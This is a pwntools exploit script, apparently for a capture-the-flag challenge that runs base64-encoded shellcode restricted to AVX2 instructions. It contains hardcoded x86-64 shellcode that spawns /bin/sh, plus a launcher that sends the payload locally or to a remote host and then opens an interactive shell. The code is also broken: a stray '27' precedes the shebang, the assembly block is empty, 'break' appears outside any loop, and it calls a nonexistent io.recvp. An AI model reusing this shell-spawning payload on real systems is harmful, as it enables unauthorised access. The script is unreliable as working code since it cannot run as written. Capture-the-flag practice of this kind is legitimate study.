27#!/usr/local/bin/python3
import mmap
import ctypes
import os
from capstone import *
from capstone.x86 import *
from pwn import *
import random

context.arch = 'amd64'

def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ("server", "port")
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

gdbscript = """
init-pwndbg
b*main+267
continue
"""

exe = "./run_shellcode"
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = "debug"

s = lambda data: io.send(data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
sla = lambda msg, data: io.sendlineafter(msg, data)
info = lambda msg: log.info(msg)
recvunt = lambda msg: io.recvuntil(msg)

# ===================EXPLOIT GOES HERE=======================

def check(code: bytes) -> bool:
    if len(code) > 0x300:
        return False

    md = Cs(CS_ARCH_X86, CS_MODE_64)
    md.detail = True

    for insn in md.disasm(code, 0):
        # Debug print each instruction
        print(f"{insn.address:02x}:\t{insn.mnemonic}\t{insn.op_str}")

        if not (X86_GRP_AVX2 in insn.groups):
            raise ValueError("AVX2 Only!")
        
        name = insn.insn_name()
        
        # No reading memory
        if "mov" in name.lower():
            raise ValueError("No movs!")

    return True


def run(code: bytes):
    sla(b"Shellcode (base64 encoded): ", code.encode())
    # io.interactive()

shellcode = b"\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05"

'''
"\x31\xf6\x48\xbf\xd1\x9d\x96\x91   \xd0\x8c\x97\xff\x48\xf7\xdf\xf7
\xe6\x04\x3b\x57\x54\x5f\x0f\x05"
'''

def main():
        # Replace this with your actual AVX2-only shellcode

    # vextracti128 [rip + 0x70], ym{x}, 0 #move into mem
    # vinserti128 ym{j}, ym{j}, xm{x}, 0 #extract lower 

            # Create a list from 0 to 15
        i = random.randint(0, 15)


        code = asm("""  
        """) 

        try:
            global io
            io = start()
            b64_shellcode = base64.b64encode(code).decode()
            run(b64_shellcode)  # Uncomment to execute
            # print(f"[+] Base64 Shellcode:\n{b64_shellcode}")
            sl(b"ls")
            io.recvp(0.5)
            break
        except :
            try:
                io.close()
            except:
                break
    print("[*] Done.")
    io.interactive()

if __name__ == "__main__":
    main()
